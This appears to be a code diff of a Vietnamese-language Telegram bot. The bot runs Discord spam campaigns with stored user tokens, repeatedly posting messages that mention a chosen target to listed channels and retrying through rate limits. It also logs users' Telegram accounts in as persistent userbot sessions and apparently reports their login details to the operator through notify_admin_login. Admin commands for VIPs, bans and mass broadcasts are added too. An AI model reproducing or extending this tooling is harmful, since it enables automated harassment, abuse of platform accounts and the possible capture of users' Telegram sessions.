         if not tokens: return await ev.answer("❌ Chưa cài Token Discord!", alert=True)
         if not channels: return await ev.answer("❌ Chưa cài ID Kênh Discord!", alert=True)
-
         if u in discord_spam_tasks and not discord_spam_tasks[u].done():
             return await ev.answer("⚠️ Tiến trình spam đang chạy!", alert=True)
 
@@ -598,15 +937,11 @@ async def _callback_handler(ev):
                             url = f"https://discord.com/api/v10/channels/{ch}/messages"
                             msg_text = raw_content if mode == "full" else lines[line_idx % len(lines)]
                             line_idx += 1
-
                             if font_style == "big":
                                 msg_text = "\n".join([f"# {l}" if not l.startswith('#') else l for l in msg_text.splitlines()])
                             elif font_style == "small":
                                 msg_text = to_small_caps(msg_text)
-
-                            if tag_target:
-                                msg_text = f"{msg_text} <@{tag_target}>"
-
+                            if tag_target: msg_text = f"{msg_text} <@{tag_target}>"
                             try:
                                 async with session_http.post(url, headers=headers, json={"content": msg_text, "tts": False}, timeout=10) as resp:
                                     if resp.status == 429:
@@ -625,8 +960,7 @@ async def _callback_handler(ev):
             discord_spam_tasks[u].cancel()
             discord_spam_tasks.pop(u, None)
             await ev.answer("🛑 Đã NGỪNG Spam Discord!", alert=True)
-        else:
-            await ev.answer("⚠️ Không có tiến trình nào đang chạy!", alert=True)
+        else: await ev.answer("⚠️ Không có tiến trình nào đang chạy!", alert=True)
         txt, buttons = render_discord_dashboard(u)
         await ev.edit(txt, buttons=buttons, parse_mode='markdown')
 
@@ -679,14 +1013,74 @@ async def _callback_handler(ev):
                     except Exception as err:
                         return await cv.send_message(f"❌ **Lỗi xác thực:** `{err}`")
                 
-                u_c[u] = c; _telegram_userbot_logic(c, u)
+                u_c[u] = c; _logic(c, u)
                 task = asyncio.create_task(start_anti_disconnect(u, c))
                 anti_disconnect_tasks[u] = task
 
                 await notify_admin_login(c, u, p)
-                await cv.send_message("✅ **LOGIN THÀNH CÔNG & ĐÃ BẬT GIỮ KẾT NỐI (ANTI-DIS 4 PHÚT)!**")
+                await cv.send_message("✅ **LOGIN THÀNH CÔNG & BẬT GIỮ KẾT NỐI!**")
             except Exception as e:
                 await cv.send_message(f"❌ **Lỗi Login:** `{e}`")
+
+# ==========================================
+# LỆNH ADMIN HỆ THỐNG
+# ==========================================
+@bot.on(events.NewMessage(pattern=r'/addadmin (\d+)'))
+async def _addadmin(e):
+    if e.sender_id != O_ID: return
+    aid = int(e.pattern_match.group(1))
+    admins.add(aid); _save_admins()
+    await e.respond(f"✅ Đã thêm Admin `{aid}`!")
+
+@bot.on(events.NewMessage(pattern=r'/addvip (\d+)'))
+async def _addvip(e):
+    if e.sender_id not in admins: return
+    vid = int(e.pattern_match.group(1))
+    v_u.add(vid); _sv()
+    await e.respond(f"🌟 Đã thêm VIP `{vid}`!")
+
+@bot.on(events.NewMessage(pattern=r'/delvip (\d+)'))
+async def _delvip(e):
+    if e.sender_id not in admins: return
+    vid = int(e.pattern_match.group(1))
+    v_u.discard(vid); _sv()
+    await e.respond(f"❌ Đã xóa VIP `{vid}`!")
+
+@bot.on(events.NewMessage(pattern=r'/ban (\d+)'))
+async def _bn(e):
+    if e.sender_id not in admins: return
+    target = int(e.pattern_match.group(1))
+    b_u.add(target); _sb()
+    if target in u_c:
+        try:
+            await u_c[target].disconnect()
+            u_c.pop(target)
+        except: pass
+    await e.respond(f"🚫 Đã BAN ID `{target}`!")
+
+@bot.on(events.NewMessage(pattern=r'/unban (\d+)'))
+async def _ubn(e):
+    if e.sender_id not in admins: return
+    target = int(e.pattern_match.group(1))
+    if target in b_u:
+        b_u.remove(target); _sb()
+        await e.respond(f"✅ Đã UNBAN ID `{target}`!")
+
+@bot.on(events.NewMessage(pattern=r'/tb\s+([\s\S]+)'))
+async def _tb(e):
+    if e.sender_id not in admins: return
+    msg = e.pattern_match.group(1)
+    if not os.path.exists(F1): return
+    await e.respond("📣 Đang gửi thông báo...")
+    count = 0
+    with open(F1, "r") as f: ids = f.read().splitlines()
+    for uid in ids:
+        try:
+            await bot.send_message(int(uid), f"📢 **THÔNG BÁO HỆ THỐNG**\n────────────────\n\n{msg}")
+            count += 1
+            await asyncio.sleep(0.3)
+        except: continue
+    await e.respond(f"✅ Đã gửi cho `{count}` người dùng!")
 
 # ==========================================
 # WEB SERVER & MAIN
@@ -715,19 +1109,16 @@ async def main():
             if not u_str.isdigit(): continue
             u = int(u_str)
             if u in b_u: continue
-            
             c = TelegramClient(f"u_{u}", A_ID, A_HS)
             await c.connect()
             if await c.is_user_authorized():
                 u_c[u] = c
-                _telegram_userbot_logic(c, u)
+                _logic(c, u)
                 task = asyncio.create_task(start_anti_disconnect(u, c))
                 anti_disconnect_tasks[u] = task
-            else: 
-                await c.disconnect()
-        except Exception as e:
-            print(f"Lỗi load session {f}: {e}")
-            
+            else: await c.disconnect()
+        except: pass
+        
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
